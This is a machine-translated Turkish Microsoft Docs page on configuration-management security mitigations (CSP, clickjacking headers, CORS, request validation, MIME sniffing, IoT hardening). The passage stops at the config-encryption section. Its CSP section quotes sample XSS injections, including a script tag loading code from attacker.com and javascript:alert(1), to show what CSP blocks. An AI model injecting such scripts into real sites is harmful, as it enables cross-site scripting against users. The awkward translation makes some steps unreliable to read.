---
title: Yapılandırma Yönetimi - Microsoft tehdit modelleme aracı - Azure | Microsoft Docs
description: Tehdit modelleme Aracı kullanıma sunulan tehdit azaltma
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: 284d0e888b89d340088f770af22c026a861a4685
ms.sourcegitcommit: f24fdd1ab23927c73595c960d8a26a74e1d12f5d
ms.translationtype: MT
ms.contentlocale: tr-TR
ms.lasthandoff: 03/27/2019
ms.locfileid: "58498392"
---
# <a name="security-frame-configuration-management--mitigations"></a>Güvenlik çerçevesi: Yapılandırma Yönetimi | Risk azaltma işlemleri 
| Ürün/hizmet | Makale |
| --------------- | ------- |
| **Web uygulaması** | <ul><li>[İçerik Güvenliği İlkesi (CSP) uygulama ve satır içi javascript devre dışı bırak](#csp-js)</li><li>[Tarayıcının XSS filtre etkinleştir](#xss-filter)</li><li>[ASP.NET uygulamaları izleme ve dağıtımdan önce hata ayıklamayı devre dışı bırakmanız gerekir](#trace-deploy)</li><li>[Yalnızca güvenilir kaynaklardan gelen erişim üçüncü taraf JavaScript'i](#js-trusted)</li><li>[Kimliği doğrulanmış ASP.NET sayfaları UI Redressing veya tıklatın jacking savunmaları dahil olun](#ui-defenses)</li><li>[ASP.NET Web uygulamalarını CORS etkinse, yalnızca güvenilir kaynaklara izin verildiğinden emin olun](#cors-aspnet)</li><li>[ASP.NET sayfaları ValidateRequest özniteliği etkinleştir](#validate-aspnet)</li><li>[Yerel olarak barındırılan JavaScript kitaplıkları'nın en son sürümleri kullanın](#local-js)</li><li>[MIME otomatik olarak algılaması devre dışı bırak](#mime-sniff)</li><li>[Standart sunucu üst bilgileri üzerinde Windows Azure izinden önlemek için Web siteleri kaldırın](#standard-finger)</li></ul> |
| **Veritabanı** | <ul><li>[Veritabanı altyapısı erişimi için Windows Güvenlik duvarını yapılandırma](#firewall-db)</li></ul> |
| **Web API** | <ul><li>[ASP.NET Web API CORS etkinse, yalnızca güvenilir kaynaklara izin verildiğinden emin olun](#cors-api)</li><li>[Hassas veriler içeren Web API'SİNİN yapılandırma dosyalarının bölümleri şifrelemek](#config-sensitive)</li></ul> |
| **IOT cihaz** | <ul><li>[Tüm yönetim arabirimleri ile güçlü kimlik bilgileri güvenli olduğundan emin olmak](#admin-strong)</li><li>[Bilinmeyen kod cihazlarda yürütülemiyor emin olun.](#unknown-exe)</li><li>[İşletim sistemi ve ek IOT cihaz bölümlerle bit locker şifrele](#partition-iot)</li><li>[Yalnızca en düşük/özelliklerin cihazlarda etkinleştirildiğinden emin olun](#min-enable)</li></ul> |
| **IOT alan ağ geçidi** | <ul><li>[İşletim sistemi ve ek IOT alan ağ geçidi bölümlerle bit locker şifrele](#field-bit-locker)</li><li>[Varsayılan oturum açma kimlik bilgilerini alan ağ geçidi yüklemesi sırasında değiştirildiğinden emin olun.](#default-change)</li></ul> |
| **IOT bulut ağ geçidi** | <ul><li>[Bulut ağ geçidine bağlı cihazların üretici yazılımı güncel tutmak için bir işlem gerçekleştirdiğinden emin olun](#cloud-firmware)</li></ul> |
| **Makine güven sınırı** | <ul><li>[Cihazları kuruluş ilkelerine göre yapılandırılmış uç nokta güvenlik denetimlerine sahip olduğundan emin olun](#controls-policies)</li></ul> |
| **Azure Depolama** | <ul><li>[Azure depolama erişim anahtarlarını güvenli Yönetimi emin olun](#secure-keys)</li><li>[Azure depolama alanında CORS etkinse, yalnızca güvenilir kaynaklara izin verildiğinden emin olun](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[WCF'ın hizmet azaltma özelliğini etkinleştir](#throttling)</li><li>[Meta verileri üzerinden WCF bilgilerin açıklanması](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>İçerik Güvenliği İlkesi (CSP) uygulama ve satır içi javascript devre dışı bırak

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [İçerik Güvenliği İlkesi giriş](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [içerik güvenliği ilkesi başvurusu](https://content-security-policy.com/), [güvenlik özellikleri](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [içerik güvenliği ilkesi giriş](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [CSP kullanabilir miyim?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Adımları** | <p>İçerik Güvenliği İlkesi (CSP), web uygulama sahipleri sitelerinde katıştırılmış içerik üzerinde denetime sahip olmasını sağlayan bir savunma güvenlik, bir W3C standart, mekanizmadır. CSP, web sunucusundaki bir HTTP yanıt üst bilgisi olarak eklenir ve istemci tarafında tarayıcılar tarafından zorlanır. Beyaz liste tabanlı bir ilke olduğunu - bir Web sitesi JavaScript yüklenebilir gibi bir dizi etkin hangi içerik güvenilir etki alanlarından bildirebilirsiniz.</p><p>CSP, aşağıdaki güvenlik faydaları sağlar:</p><ul><li>**XSS karşı koruma:** Bir saldırganın bir sayfa için XSS saldırılara açık ise, 2 yollarla yararlanabilir:<ul><li>Ekleme `<script>malicious code</script>`. Bu yararlanma CSP'nin temel kısıtlama-1 nedeniyle çalışmaz</li><li>Ekleme `<script src=”http://attacker.com/maliciousCode.js”/>`. Denetlenen saldırgan etki alanlarının CSP'nin güvenilir listesinde bulunmaz, bu yararlanma çalışmaz</li></ul></li><li>**Üzerinde veri Sızdırma denetler:** Bir Web sayfasında herhangi bir kötü amaçlı içerik bir dış Web sitesine bağlayın ve verileri çalmaya çalışırsa, CSP tarafından bağlantı iptal edilecek. Hedef etki alanına CSP'nin izin verilenler listesinde olmayacaktır olmasıdır</li><li>**Click jacking karşı savunma:** tıklatın jacking olan bir saldırgan, kullanıcı Arabirimi öğelerinde tıklatın gerçek bir Web sitesi ve zorla kullanıcılar çerçeve kullandığı bir saldırı teknik. Şu anda tıklatın jacking korunmanın bir yanıt üst bilgisi-X-Frame-Options yapılandırılmasıyla gerçekleştirilir. Tüm tarayıcılar bu başlığı gösteririz ve iletme CSP gidip tıklayın jacking karşı korumaya için standart bir biçimde olacaktır</li><li>**Gerçek zamanlı saldırı raporlama:** Bir ekleme saldırısına CSP etkin Web sitesi varsa, tarayıcılar için Web sunucusu üzerinde yapılandırılan bir uç noktası bir bildirim otomatik olarak gerçekleştirir. Bu şekilde, CSP gerçek zamanlı bir uyarı sistemi olarak görev yapar.</li></ul> |

### <a name="example"></a>Örnek
Örnek ilke: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Bu ilke, yalnızca web uygulamasının server ve google analytics Server'dan yüklemek komut dosyaları sağlar. Başka bir siteden yüklenen betikleri reddedilir. Bir Web sitesinde CSP etkin olduğunda, aşağıdaki özellikleri otomatik olarak XSS saldırılarını azaltmak için devre dışı bırakılır. 

### <a name="example"></a>Örnek
Satır içi komut dosyaları çalıştırır. Satır içi komut dosyası örnekleri aşağıda verilmiştir 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Örnek
Dizeleri kod olarak değerlendirilmez. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Tarayıcının XSS filtre etkinleştir

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [XSS koruma filtresi](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Adımları** | <p>Tarayıcının siteler arası betik filtre X XSS koruma yanıtı üstbilgisi yapılandırmasını denetler. Bu yanıt üst bilgisi, aşağıdaki değerleri içerebilir:</p><ul><li>`0:` Bu filtre devre dışı bırakır</li><li>`1: Filter enabled` Siteler arası betik saldırı algılanırsa, saldırı durdurmak için tarayıcı sayfayı temizleyin</li><li>`1: mode=block : Filter enabled`. Bunun yerine XSS saldırısı algılandığında, sayfayı temizleyin. daha tarayıcı sayfa işleme engeller</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Tarayıcı sayfa temizleyin ve rapor ihlali.</li></ul><p>Ayrıntılar için tercih ettiğiniz bir URI göndermek için CSP ihlali raporları kullanarak Chromium işlevidir. Son 2 seçenek güvenli değerler olarak kabul edilir.</p>|

## <a id="trace-deploy"></a>ASP.NET uygulamaları izleme ve dağıtımdan önce hata ayıklamayı devre dışı bırakmanız gerekir

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [ASP.NET hata ayıklamaya genel bakış](https://msdn.microsoft.com/library/ms227556.aspx), [ASP.NET izlemeye genel bakış](https://msdn.microsoft.com/library/bb386420.aspx), [nasıl yapılır: Bir ASP.NET uygulaması için izlemeyi etkinleştirme](https://msdn.microsoft.com/library/0x5wc973.aspx), [nasıl yapılır: ASP.NET uygulamaları için hata ayıklamayı etkinleştirme](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Adımları** | Zaman izleme, iç sunucu durumu ve iş akışı hakkında veri içeren izleme bilgilerini de alır isteyen her tarayıcı sayfa için etkinleştirilir. Bu bilgileri güvenlik duyarlı olabilir. Sayfa için hata ayıklama etkinleştirildiğinde, sunucuda'olmuyor hataları tarayıcıya sunulan tam yığın izleme verileri sonuçlanır. Bu verileri, sunucunun iş akışıyla ilgili güvenlik bakımından hassas bilgiler ortaya çıkarabilir. |

## <a id="js-trusted"></a>Yalnızca güvenilir kaynaklardan gelen erişim üçüncü taraf JavaScript'i

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | Yok  |
| **Adımları** | üçüncü taraf JavaScript'i yalnızca güvenilir kaynaklardan gelen başvurulması gerekir. Başvuru uç noktalarına her zaman SSL olmalıdır. |

## <a id="ui-defenses"></a>Kimliği doğrulanmış ASP.NET sayfaları UI Redressing veya tıklatın jacking savunmaları dahil olun

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [Savunma hile sayfasını tıklatın jacking OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE tıklatın jacking ile X-Frame-Options mücadele iç işlevler -](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Adımları** | <p>jacking tıklatın, olarak da bilinen bir "kullanıcı Arabirimi redress", saldırıdır bir saldırganın bir kullanıcı bir düğmeyi tıklamak kandırmaya veya bunların üst düzey sayfasında tıklayın amaçlanıyorsa, başka bir sayfadaki bağlamak için birden çok saydam veya donuk katmanları kullandığında.</p><p>Bu katman, kurbanın sayfayı yüklemez iframe kötü amaçlı bir sayfayla kaynaklı tarafından sağlanır. Bu nedenle, saldırgan "için kendi sayfasında geliyordu ve bunları başka bir sayfaya, büyük olasılıkla başka bir uygulama, etki alanı veya her ikisi tarafından sahip olunan yönlendirme tıklama ele". Tıklatın jacking saldırılarını önlemek için diğer etki alanlarından çerçeveleme izin vermeyecek şekilde tarayıcısına uygun X-Frame-Options HTTP yanıt üst bilgilerini ayarlayacak.</p>|

### <a name="example"></a>Örnek
X-FRAME-OPTIONS üstbilgisi IIS web.config ayarlanabilir. Hiçbir zaman Çerçeveli siteler için Web.config kod parçacığı: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Örnek
Web.config kod sayfaları aynı etki alanında yalnızca Çerçeveli siteler için: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>ASP.NET Web uygulamalarını CORS etkinse, yalnızca güvenilir kaynaklara izin verildiğinden emin olun

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Web Forms, MVC5 |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | Yok  |
| **Adımları** | <p>Tarayıcı güvenliği, bir web sitesinin başka bir etki alanına AJAX istekleri göndermesini engeller. Bu kısıtlama aynı çıkış noktası ilkesi olarak adlandırılır ve kötü amaçlı bir siteyi başka bir siteden hassas verileri okumasını önler. Ancak, bazı durumlarda, diğer siteleri tüketebileceği API'leri güvenli bir şekilde kullanıma sunmak için gerekli olabilir. Çapraz kaynak kaynak paylaşımı (CORS) gevşek bir aynı çıkış noktası İlkesi bir sunucu izin veren bir W3C standardıdır. CORS kullanarak, bir sunucu açıkça bazı çıkış noktaları arası istekleri izin verirken diğerlerini.</p><p>CORS, güvenli ve JSONP gibi önceki teknikler daha esnektir. Özünde, birkaç HTTP yanıt üst bilgilerini eklemek için CORS'yi etkinleştirme çevirir (Access - Control-*) web uygulaması ve bu birkaç farklı şekilde yapılabilir.</p>|

### <a name="example"></a>Örnek
Web.config erişimi varsa, CORS aşağıdaki kodu eklenebilir: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Örnek
Web.config erişimi kullanılamıyorsa, CORS CSharp aşağıdaki kodu ekleyerek yapılandırılabilir: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Kaynakları "Access-Control-Allow-Origin" öznitelik listesini kaynakları sınırlı ve güvenilen kümesini ayarlandığından emin olmak için önemli olduğunu unutmayın. Bu uygunsuz bir şekilde yapılandırmak başarısız olan (örn, ayar değeri olarak ' *') web uygulaması için başlangıç noktaları arası isteklere tetiklemek kötü amaçlı siteleri sağlayacak > herhangi bir kısıtlama, böylece uygulamayı CSRF saldırılara açık hale getirme. 

## <a id="validate-aspnet"></a>ASP.NET sayfaları ValidateRequest özniteliği etkinleştir

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Web Forms, MVC5 |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [İstek doğrulama - betik saldırılarını önleme](https://www.asp.net/whitepapers/request-validation) |
| **Adımları** | <p>İstek doğrulamanın, ASP.NET 1.1 sürümünden bir özelliği, sunucu içeren içerik beklemediğiniz kodlanmış HTML kabul etmesini önler. Bu özellik ile istemci komut dosyası kodu veya HTML farkında olmadan bir sunucuya gönderilen, depolanabilir ve ardından diğer kullanıcılara sunulan bazı betik ekleme saldırıları önlemeye yardımcı olmak için tasarlanmıştır. Yine de tüm giriş verilerini doğrulamak ve HTML kodlamasına da uygun olduğunda önerilir.</p><p>İstek doğrulama, potansiyel olarak tehlikeli olabilecek değerler listesini tüm giriş verilerini karşılaştırarak gerçekleştirilir. Bir eşleşme olursa, ASP.NET başlatan bir `HttpRequestValidationException`. Varsayılan olarak, doğrulama isteği özelliği etkin.</p>|

### <a name="example"></a>Örnek
Ancak, bu özellik sayfa düzeyinde devre dışı bırakılabilir: 
```XML
<%@ Page validateRequest="false" %> 
```
veya uygulama düzeyinde 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
İstek doğrulama Bu özellik desteklenmiyor ve MVC6 işlem hattı bir parçası değil. Lütfen unutmayın. 

## <a id="local-js"></a>Yerel olarak barındırılan JavaScript kitaplıkları'nın en son sürümleri kullanın

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | Yok  |
| **Adımları** | <p>JQuery kullanmalısınız gibi standart JavaScript kitaplıkları kullanan geliştiriciler bilinen güvenlik açıkları içermeyen ortak JavaScript kitaplıkları sürümlerini onaylandı. Bunlar eski sürümlerine bilinen güvenlik açıkları için güvenlik düzeltmelerini içeren bu yana kitaplıklarının en son sürümünü kullanmak iyi bir uygulamadır.</p><p>En son sürüme uyumluluk nedenlerle kullandıysanız en düşük sürümlerle kullanılmalıdır.</p><p>Kabul edilebilir en düşük sürüm:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery doğrulama 1.9</li><li>JQuery Mobile 1.0.1</li><li>jQuery döngüsü 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX Denetim Araç Seti**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms ve Ajax**<ul><li>ASP.NET Web Forms ve Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Genel CDN'ler gibi dış sitelerden hiçbir zaman herhangi bir JavaScript Kitaplığı yükleyin.</p>|

## <a id="mime-sniff"></a>MIME otomatik olarak algılaması devre dışı bırak

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [IE8 Güvenlik bölümü V: Kapsamlı koruma](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME türü](https://en.wikipedia.org/wiki/Mime_type) |
| **Adımları** | X-içerik-türü-Options üstbilgisi içeriklerini MIME sızılmasını olmamalıdır belirtmek geliştiricilerinin sağlayan bir HTTP üstbilgisi ' dir. Bu üstbilginin MIME algılaması saldırıları azaltmak için tasarlanmıştır. Kullanıcı denetlenebilir içerik içerebilen her sayfa için HTTP üst bilgisi X kullanmanız gerekir-içerik-türü-seçenekleri: nosniff. Genel olarak, uygulamadaki tüm sayfalar için gereken üst bilgi etkinleştirmek için aşağıdakilerden birini yapabilirsiniz|

### <a name="example"></a>Örnek
Uygulama Internet Information Services (IIS tarafından) 7 veya sonraki sürümleri barındırılıyorsa üstbilgi web.config dosyasına ekleyin. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Örnek
Genel Uygulama üstbilgisi Ekle\_BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Örnek
Uygulama özel HTTP modülü 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Örnek
Gerekli başlık yalnızca belirli bir sayfa için bireysel yanıtlarını ekleyerek etkinleştirebilirsiniz: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Standart sunucu üst bilgileri üzerinde Windows Azure izinden önlemek için Web siteleri kaldırın

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | EnvironmentType - Azure |
| **Başvuruları**              | [Standart sunucu üstbilgiler Windows Azure Web Siteleri'nde kaldırılıyor](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Adımları** | Üst bilgiler gibi sunucu, X-desteklenen-tarafından X-ASP.NET-Version sunucusu ve temel teknolojileri hakkında bilgi gösterir. Böylece bu üst bilgilerini gizlemek için önerilen uygulama izinden önleme |

## <a id="firewall-db"></a>Veritabanı altyapısı erişimi için Windows Güvenlik duvarını yapılandırma

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Database | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | SQL Azure, şirket içi |
| **Öznitelikler**              | Yok, SQL sürüm - V12 |
| **Başvuruları**              | [Bir Azure SQL veritabanı güvenlik duvarını yapılandırma hakkında](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [veritabanı altyapısı erişimi için Windows Güvenlik duvarını yapılandırma](https://msdn.microsoft.com/library/ms175043) |
| **Adımları** | Güvenlik Duvarı sistemlerini bilgisayar kaynaklara yetkisiz erişimi önlemeye yardımcı olur. SQL Server veritabanı altyapısı örneği, bir güvenlik duvarı üzerinden erişmek için erişime izin vermek için SQL Server çalıştıran bilgisayarda güvenlik duvarını yapılandırmalısınız. |

## <a id="cors-api"></a>ASP.NET Web API CORS etkinse, yalnızca güvenilir kaynaklara izin verildiğinden emin olun

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web API | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | MVC 5 |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [ASP.NET Web API 2'de kaynaklar arası istekleri etkinleştirme](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - ASP.NET Web API 2'de CORS desteği](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Adımları** | <p>Tarayıcı güvenliği, bir web sitesinin başka bir etki alanına AJAX istekleri göndermesini engeller. Bu kısıtlama aynı çıkış noktası ilkesi olarak adlandırılır ve kötü amaçlı bir siteyi başka bir siteden hassas verileri okumasını önler. Ancak, bazı durumlarda, diğer siteleri tüketebileceği API'leri güvenli bir şekilde kullanıma sunmak için gerekli olabilir. Çapraz kaynak kaynak paylaşımı (CORS) gevşek bir aynı çıkış noktası İlkesi bir sunucu izin veren bir W3C standardıdır.</p><p>CORS kullanarak, bir sunucu açıkça bazı çıkış noktaları arası istekleri izin verirken diğerlerini. CORS, güvenli ve JSONP gibi önceki teknikler daha esnektir.</p>|

### <a name="example"></a>Örnek
App_Start/WebApiConfig.cs içinde WebApiConfig.Register metoduna aşağıdaki kodu ekleyin. 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Örnek
EnableCors özniteliği bir denetleyici eylem yöntemlerinde aşağıdaki şekilde uygulanabilir: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Çıkış noktaları EnableCors öznitelik listesini kaynakları sınırlı ve güvenilen kümesini ayarlandığından emin olmak için önemli olduğunu unutmayın. Bu uygunsuz bir şekilde yapılandırmak başarısız (örn, ayar değeri olarak ' *') herhangi bir kısıtlama olmadan API için başlangıç noktaları arası isteklere tetiklemek kötü amaçlı siteleri sağlayacak > böylece API'yi CSRF saldırılara açık hale. Denetleyici düzeyinde EnableCors tasarlanabilir. 

### <a name="example"></a>Örnek
Bir sınıfın belirli bir Metoda CORS devre dışı bırakmak için DisableCors öznitelik aşağıda gösterildiği gibi kullanılabilir: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web API | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | MVC 6 |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [ASP.NET Core 1.0, çıkış noktaları arası istekleri (CORS) etkinleştirme](https://docs.asp.net/en/latest/security/cors.html) |
| **Adımları** | <p>ASP.NET Core 1.0, CORS ara yazılımı kullanarak veya MVC kullanarak etkinleştirilebilir. MVC CORS'yi etkinleştirmek için kullanırken aynı CORS Hizmetleri kullanılır, ancak CORS ara yazılımı değil.</p>|

**Yaklaşım 1** etkinleştirme CORS ile Ara yazılım: Etkinleştirmek için uygulamanın tamamı için CORS CORS ara yazılımı UseCors genişletme yöntemi kullanarak istek ardışık düzenini ekleyin. Çıkış noktaları arası ilke CorsPolicyBuilder sınıfını kullanarak bir CORS ara yazılım eklerken belirtilebilir. Bunu yapmanın iki yolu vardır:

### <a name="example"></a>Örnek
İlki, bir lambda ile UseCors çağırmaktır. Lambda CorsPolicyBuilder nesnesini alır: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Örnek
Bir veya daha fazla adlandırılmış CORS ilkelerini tanımlama ve ardından ilkeyi çalışma zamanında adına göre seçmek için saniyedir. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Yaklaşım 2** mvc'de CORS'yi etkinleştirme: Geliştiriciler, MVC denetleyicisi başına veya genel olarak tüm denetleyicileri için eylem başına belirli CORS uygulamak için alternatif olarak kullanabilirsiniz.

### <a name="example"></a>Örnek
Eylem: Belirli bir eylem için ilke bir CORS belirtmek için eyleme [EnableCors] özniteliğini ekleyin. İlke adı belirtin. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Örnek
Denetleyici: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Örnek
Genel olarak: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Çıkış noktaları EnableCors öznitelik listesini kaynakları sınırlı ve güvenilen kümesini ayarlandığından emin olmak için önemli olduğunu unutmayın. Bu uygunsuz bir şekilde yapılandırmak başarısız (örn, ayar değeri olarak ' *') herhangi bir kısıtlama olmadan API için başlangıç noktaları arası isteklere tetiklemek kötü amaçlı siteleri sağlayacak > böylece API'yi CSRF saldırılara açık hale. 

### <a name="example"></a>Örnek
Bir denetleyici veya eylem için CORS devre dışı bırakmak için [DisableCors] özniteliğini kullanın. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Hassas veriler içeren Web API'SİNİN yapılandırma dosyalarının bölümleri şifrelemek

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web API | 
| **SDL aşaması**               | Dağıtım |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [Nasıl Yapılır: ASP.NET 2.0 kullanarak DPAPI yapılandırma bölümlerde şifrelemek](https://msdn.microsoft.com/library/ff647398.aspx), [korumalı bir yapılandırma sağlayıcısı belirtme](https://msdn.microsoft.com/library/68ze1hb2.aspx), [uygulama parolalarını korumak için Azure Key Vault kullanma](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
